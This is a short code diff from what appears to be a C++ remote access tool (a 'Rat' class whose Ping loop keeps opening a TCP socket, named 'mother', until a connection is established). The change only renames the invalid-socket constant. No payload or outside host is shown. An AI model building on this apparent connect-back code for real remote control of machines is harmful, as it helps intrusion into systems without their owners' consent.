@@ -28,7 +28,7 @@ void Rat::Ping() {
     while (ratState != RatState::ESTAB) {
         std::cout << "[*] Attempting to create Socket. . ." << std::endl;
         mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (mother == INVALID_SOCKET) {
+        if (mother == INVALID_SOCKET_HANDLE) {
             std::cerr << "[-] Socket creation failed.\n";
 
             ratState = RatState::PINGING;
